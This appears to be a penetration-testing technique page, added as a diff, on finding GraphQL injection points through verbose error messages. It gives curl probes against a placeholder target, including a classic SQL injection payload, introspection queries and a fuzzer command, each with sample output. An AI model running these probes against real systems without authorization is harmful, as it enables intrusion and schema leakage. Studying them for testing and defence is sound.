@@ -1,0 +1,87 @@
+---
+title: Identifying GraphQL Injection Points Effectively
+description: Learn to identify GraphQL injection points using error-based feedback
+  and malformed query techniques for enhanced security.
+keywords:
+- GraphQL injection
+- error-based feedback
+- malformed queries
+- schema error
+- graphql introspection
+- injection points
+- invalid field injection
+- input validation
+- schema leakage
+- error handling
+---
+
+# Identify An Injection Point
+
+## Context
+
+The objective of this technique is to enable you to identify GraphQL injection points by exploiting error-based feedback and malformed query methods. It assumes a working knowledge of GraphQL queries and schemas, general error handling mechanisms in web applications, and a basic understanding of GraphQL injection.
+
+## Theory
+
+### GraphQL Error Feedback as an Enumeration Vector
+
+GraphQL is known for its detailed error messages, which often reveal schema details and input validation logic. By sending malformed queries, you can trigger verbose error responses that expose potential injection points. This forms the core of our approach: by crafting intentionally invalid queries, you can observe error handling behaviors that might reveal schema information.
+
+### Schema Error Reflection and Injection Discovery
+
+Improper error sanitization in GraphQL can allow attackers to infer valid fields and injection vectors. By crafting queries with invalid fields or types, you can bypass superficial input validation. Through iterative mutation of query structures, you can map how error responses relate to backend schema logic, enabling the discovery of potential injection points.
+
+### Detection of Injection Points via Malformed Queries
+
+Injection points are specific locations in queries where attacker-controlled input can alter execution. For this detection method to work, the application must reflect or return descriptive error messages when handling malformed queries. By submitting queries with syntax errors, invalid fields, or reserved introspection keywords, you can identify such points.
+
+## Practice
+
+### Manual Error-Based Injection Point Discovery
+
+1. **Inject a Non-existent Field**
+   - Execute the following command to send a query with a non-existent field:
+     ```bash
+     curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query":"{invalidField}"}'
+     ```
+   - Observe the error message for schema leakage or field validation details:
+     ```
+     {"errors":[{"message":"Cannot query field 'invalidField' on type 'Query'."}]}
+     ```
+
+2. **Classic SQL Injection Payload**
+   - Test for backend injection handling with a classic SQL injection payload:
+     ```bash
+     curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query":"{user(id: \"1' OR '1'='1\") {name}}"}'
+     ```
+   - Analyze the error message to assess input parsing and potential vulnerabilities:
+     ```
+     {"errors":[{"message":"Syntax Error: Unexpected string."}]}
+     ```
+
+3. **Attempt Introspection**
+   - Attempt to access the schema introspection:
+     ```bash
+     curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query":"{__schema {types {name}}}"}'
+     ```
+   - Determine whether introspection is blocked or if error messages provide useful information:
+     ```
+     {"errors":[{"message":"Introspection is disabled."}]}
+     ```
+
+### Automated Malformed Query Fuzzing
+
+1. **Run GraphQL Fuzzer**
+   - Use a fuzzer to automate the sending of malformed queries and collect error responses:
+     ```bash
+     python3 graphql-fuzzer.py --url http://target/graphql --payloads malformed_queries.txt
+     ```
+   - Review the fuzzer's output for fields that generate verbose or unique error messages:
+     ```
+     Potential injection point detected at 'user.email' - error: 'Cannot query field...'
+     ```
+
+## Tools
+
+- **curl**
+- **graphql-fuzzer**
